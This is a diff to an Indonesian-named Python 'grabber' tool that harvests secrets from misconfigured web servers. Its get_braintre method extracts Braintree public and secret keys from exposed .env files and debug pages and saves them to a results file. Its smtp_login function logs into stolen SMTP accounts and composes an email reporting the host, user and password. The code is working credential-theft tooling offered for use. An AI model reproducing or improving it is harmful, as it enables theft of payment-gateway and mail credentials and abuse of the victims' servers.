@@ -1807,8 +1807,10 @@ class grabber:
                 return objek
 
     def get_braintre(self, method, urlku, teks):
+        
         if method == 'env':
             if 'BRAINTREE_PUBLIC_KEY=' in teks:
+                objek = 0
                 try:
                     key = re.findall('BRAINTREE_PUBLIC_KEY=(.*?)\n', teks)[0]
                     if '\r' in key:
@@ -1822,6 +1824,7 @@ class grabber:
                         satu = clean(str(key) + "|" + str(sec))
                         with open('Result/braintre.txt', 'a') as ff:
                             ff.write(satu + '\n')
+                        objek += 1
                         return True
                 except:
                     return False
@@ -1829,6 +1832,7 @@ class grabber:
                 return False
         elif method == 'debug':
             if 'BRAINTREE_PUBLIC_KEY' in teks:
+                objek = 0
                 try:
                     key = re.findall('<td>BRAINTREE_PUBLIC_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                     if '\r' in key:
@@ -1842,6 +1846,7 @@ class grabber:
                         satu = clean(str(key) + "|" + str(sec))
                         with open('Result/braintre.txt', 'a') as ff:
                             ff.write(satu + '\n')
+                        objek += 1
                         return True
                 except:
                     return False
@@ -3078,17 +3083,18 @@ def smtp_login(target, tutor, hostnya, portnya, usernya, pwnya,mail_fromer=False
                 <p>PORT : """ + portnya + """</p>
                 <p>USER : """ + usernya + """</p>
                 <p>PASS : """ + pwnya + """</p>
-                <p>FROM : """ + mailfrom + """</p> 
+                <p>FROM : """ + mail_name + """</p> 
                 """, 'html', 'utf-8'))
     else:
         if comment:
             msg.attach(MIMEText(comment, 'html', 'utf-8'))
         else:
-            msg.attach(MIMEText(""" <p>HOST : """ + hostnya + """</p>
+            msg.attach(MIMEText(
+            """ <p>HOST : """ + hostnya + """</p>
                 <p>PORT : """ + portnya + """</p>
                 <p>USER : """ + usernya + """</p>
                 <p>PASS : """ + pwnya + """</p>
-                <p>FROM : """ + mailfrom + """</p>""", 'html', 'utf-8'))
+                <p>FROM : """ + mail_from + """</p>""", 'html', 'utf-8'))
     try:
         server = smtplib.SMTP(hostnya, int(portnya),timeout=10)
         server.login(usernya, pwnya)
